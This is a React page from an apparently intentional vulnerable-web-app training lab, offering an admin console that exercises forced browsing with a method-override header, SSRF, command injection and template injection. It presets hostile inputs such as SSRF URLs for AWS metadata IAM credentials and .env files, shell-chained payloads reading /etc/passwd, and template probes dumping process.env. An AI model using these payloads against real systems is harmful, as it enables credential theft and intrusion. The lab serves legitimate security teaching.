"use client";

import React, { useEffect, useState } from "react";
import { Globe, Terminal, ShieldAlert, FileText, Zap } from "lucide-react";
import { useLab } from "@/components/LabProvider";

export default function AdminPage() {
  const { securityLevel, refreshLabState } = useLab();

  // AUTHZ-03 Admin Users dump
  const [adminData, setAdminData] = useState<any>(null);
  const [adminStatus, setAdminStatus] = useState<number>(200);

  // INJ-03 SSRF
  const [ssrfUrl, setSsrfUrl] = useState(
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnlab-prod-admin-role"
  );
  const [ssrfResult, setSsrfResult] = useState<any>(null);

  // INJ-05 Command Injection
  const [pingHost, setPingHost] = useState("127.0.0.1; id; whoami; cat /etc/passwd");
  const [cmdResult, setCmdResult] = useState<any>(null);

  // INJ-05 SSTI
  const [templateInput, setTemplateInput] = useState(
    "Invoice for {{customer_name}} | Math Probe: {{7*7}} | Secrets: {{process.env}}"
  );
  const [sstiResult, setSstiResult] = useState<any>(null);

  const fetchAdminUsers = async (useMethodOverride = false) => {
    const res = await fetch("/api/admin/users", {
      method: useMethodOverride ? "POST" : "GET",
      headers: useMethodOverride
        ? { "X-HTTP-Method-Override": "GET" }
        : undefined,
    });
    setAdminStatus(res.status);
    setAdminData(await res.json());
    await refreshLabState();
  };

  useEffect(() => {
    fetchAdminUsers(false);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [securityLevel]);

  const handleSsrf = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/products/fetch-image", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: ssrfUrl }),
    });
    setSsrfResult(await res.json());
    await refreshLabState();
  };

  const handleCmd = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/admin/diagnostics", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ host: pingHost }),
    });
    setCmdResult(await res.json());
    await refreshLabState();
  };

  const handleSsti = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/invoices/preview", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ template: templateInput }),
    });
    setSstiResult(await res.json());
    await refreshLabState();
  };

  return (
    <div className="space-y-6">
      {/* 1. AUTHZ-03 Forced Browsing & Method Override */}
      <div className="rounded-2xl border border-slate-800 bg-slate-900/70 p-6">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div>
            <span className="rounded bg-rose-500/20 border border-rose-500/40 px-2.5 py-0.5 font-mono text-xs text-rose-300">
              AUTHZ-03: Forced Browsing & HTTP Method Tampering
            </span>
            <h1 className="mt-2 text-2xl font-bold text-white">
              Internal Administration & Diagnostics Console
            </h1>
          </div>

          <div className="flex flex-wrap gap-2">
            <button
              type="button"
              onClick={() => fetchAdminUsers(false)}
              className="rounded-xl border border-slate-700 bg-slate-800 px-3.5 py-2 text-xs font-semibold text-slate-200 hover:bg-slate-700 cursor-pointer"
            >
              Standard GET /api/admin/users
            </button>
            <button
              type="button"
              onClick={() => fetchAdminUsers(true)}
              className="inline-flex items-center gap-1 rounded-xl bg-rose-600 px-3.5 py-2 text-xs font-semibold text-white hover:bg-rose-500 cursor-pointer"
            >
              <Zap className="h-3.5 w-3.5" />
              Bypass with POST + X-HTTP-Method-Override: GET
            </button>
          </div>
        </div>

        {adminStatus !== 200 ? (
          <div className="mt-4 rounded-xl border border-red-500/40 bg-red-950/30 p-4 font-mono text-xs text-red-200">
            <ShieldAlert className="inline h-4 w-4 mr-1.5 text-red-400" />
            HTTP {adminStatus}: {adminData?.error}
          </div>
        ) : (
          <div className="mt-4 overflow-x-auto rounded-xl border border-slate-800 bg-slate-950 p-4">
            <div className="mb-2 text-xs font-bold text-emerald-400 font-mono">
              Dumped User Table (Passwords, Reset Tokens & Master API Keys):
            </div>
            <table className="w-full text-left font-mono text-xs text-slate-300">
              <thead className="border-b border-slate-800 text-slate-400">
                <tr>
                  <th className="py-1.5 pr-3">ID</th>
                  <th className="py-1.5 pr-3">User / Email</th>
                  <th className="py-1.5 pr-3">Password Hash</th>
                  <th className="py-1.5 pr-3">Role</th>
                  <th className="py-1.5 pr-3">Reset Token</th>
                  <th className="py-1.5">API Key / Flag</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/70">
                {(adminData?.users || []).map((u: any) => (
                  <tr key={u.id}>
                    <td className="py-1.5 pr-3">{u.id}</td>
                    <td className="py-1.5 pr-3 text-white">{u.email}</td>
                    <td className="py-1.5 pr-3 text-rose-300">
                      {u.password_hash}
                    </td>
                    <td className="py-1.5 pr-3 text-indigo-300">{u.role}</td>
                    <td className="py-1.5 pr-3 text-amber-300">
                      {u.reset_token}
                    </td>
                    <td className="py-1.5 text-emerald-300 break-all">
                      {u.api_key}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* 2. INJ-03 SSRF + INJ-05 Command Injection + INJ-05 SSTI */}
      <div className="grid grid-cols-1 gap-6 lg:grid-cols-3">
        {/* SSRF */}
        <form
          onSubmit={handleSsrf}
          className="flex flex-col justify-between space-y-3 rounded-2xl border border-slate-800 bg-slate-900/70 p-5"
        >
          <div className="space-y-2">
            <div className="flex items-center gap-2 text-rose-300 font-bold text-sm">
              <Globe className="h-4 w-4" />
              <h2>Remote Image Fetcher (INJ-03 SSRF)</h2>
            </div>
            <p className="text-xs text-slate-400">
              Fetches internal cloud metadata (
              <code>169.254.169.254</code>), internal Redis (
              <code>127.0.0.1:6379</code>), or <code>file:///etc/passwd</code>.
            </p>
            <div className="flex flex-wrap gap-1">
              <button
                type="button"
                onClick={() =>
                  setSsrfUrl(
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnlab-prod-admin-role"
                  )
                }
                className="rounded bg-slate-800 px-2 py-0.5 text-[11px] text-amber-300 hover:bg-slate-700 cursor-pointer"
              >
                AWS Metadata IAM
              </button>
              <button
                type="button"
                onClick={() => setSsrfUrl("http://127.0.0.1:6379/INFO")}
                className="rounded bg-slate-800 px-2 py-0.5 text-[11px] text-indigo-300 hover:bg-slate-700 cursor-pointer"
              >
                Internal Redis :6379
              </button>
              <button
                type="button"
                onClick={() => setSsrfUrl("file:///var/www/.env")}
                className="rounded bg-slate-800 px-2 py-0.5 text-[11px] text-emerald-300 hover:bg-slate-700 cursor-pointer"
              >
                file:///var/www/.env
              </button>
            </div>
            <input
              type="text"
              value={ssrfUrl}
              onChange={(e) => setSsrfUrl(e.target.value)}
              className="w-full rounded-lg border border-slate-700 bg-slate-950 px-3 py-2 font-mono text-xs text-white"
            />
          </div>

          <button
            type="submit"
            className="w-full rounded-xl bg-rose-600 py-2 text-xs font-semibold text-white hover:bg-rose-500 cursor-pointer"
          >
            Fetch Remote URL (SSRF)
          </button>

          {ssrfResult && (
            <pre className="max-h-48 overflow-auto rounded-lg border border-slate-800 bg-slate-950 p-2.5 font-mono text-[11px] text-emerald-300">
              {ssrfResult.fetchedResult?.body ||
                JSON.stringify(ssrfResult, null, 2)}
            </pre>
          )}
        </form>

        {/* Command Injection */}
        <form
          onSubmit={handleCmd}
          className="flex flex-col justify-between space-y-3 rounded-2xl border border-slate-800 bg-slate-900/70 p-5"
        >
          <div className="space-y-2">
            <div className="flex items-center gap-2 text-amber-300 font-bold text-sm">
              <Terminal className="h-4 w-4" />
              <h2>Network Ping Utility (INJ-05 CMDi)</h2>
            </div>
            <p className="text-xs text-slate-400">
              Concatenates host input into{" "}
              <code>/bin/sh -c &quot;ping -c 2 $HOST&quot;</code>. Try{" "}
              <code>;</code>, <code>|</code>, or <code>&amp;&amp;</code>{" "}
              separators.
            </p>
            <div className="flex flex-wrap gap-1">
              <button
                type="button"
                onClick={() => setPingHost("127.0.0.1; id; whoami")}
                className="rounded bg-slate-800 px-2 py-0.5 text-[11px] text-amber-300 hover:bg-slate-700 cursor-pointer"
              >
                ; id; whoami
              </button>
              <button
                type="button"
                onClick={() => setPingHost("127.0.0.1 | cat /etc/passwd")}
                className="rounded bg-slate-800 px-2 py-0.5 text-[11px] text-rose-300 hover:bg-slate-700 cursor-pointer"
              >
                | cat /etc/passwd (Bypass Medium)
              </button>
            </div>
            <input
              type="text"
              value={pingHost}
              onChange={(e) => setPingHost(e.target.value)}
              className="w-full rounded-lg border border-slate-700 bg-slate-950 px-3 py-2 font-mono text-xs text-white"
            />
          </div>

          <button
            type="submit"
            className="w-full rounded-xl bg-amber-600 py-2 text-xs font-semibold text-white hover:bg-amber-500 cursor-pointer"
          >
            Run Diagnostic Ping
          </button>

          {cmdResult && (
            <pre className="max-h-48 overflow-auto rounded-lg border border-slate-800 bg-slate-950 p-2.5 font-mono text-[11px] text-amber-200">
              {cmdResult.output || JSON.stringify(cmdResult, null, 2)}
            </pre>
          )}
        </form>

        {/* SSTI */}
        <form
          onSubmit={handleSsti}
          className="flex flex-col justify-between space-y-3 rounded-2xl border border-slate-800 bg-slate-900/70 p-5"
        >
          <div className="space-y-2">
            <div className="flex items-center gap-2 text-indigo-300 font-bold text-sm">
              <FileText className="h-4 w-4" />
              <h2>Invoice Template Engine (INJ-05 SSTI)</h2>
            </div>
            <p className="text-xs text-slate-400">
              Evaluates template directives{" "}
              <code>{`{{7*7}}`}</code>, <code>{`\${7*7}`}</code>, and{" "}
              <code>{`{{process.env}}`}</code> server-side.
            </p>
            <textarea
              rows={3}
              value={templateInput}
              onChange={(e) => setTemplateInput(e.target.value)}
              className="w-full rounded-lg border border-slate-700 bg-slate-950 p-2.5 font-mono text-xs text-white"
            />
          </div>

          <button
            type="submit"
            className="w-full rounded-xl bg-indigo-600 py-2 text-xs font-semibold text-white hover:bg-indigo-500 cursor-pointer"
          >
            Render Invoice Template
          </button>

          {sstiResult && (
            <pre className="max-h-48 overflow-auto rounded-lg border border-slate-800 bg-slate-950 p-2.5 font-mono text-[11px] text-indigo-200">
              {sstiResult.rendered || JSON.stringify(sstiResult, null, 2)}
            </pre>
          )}
        </form>
      </div>
    </div>
  );
}

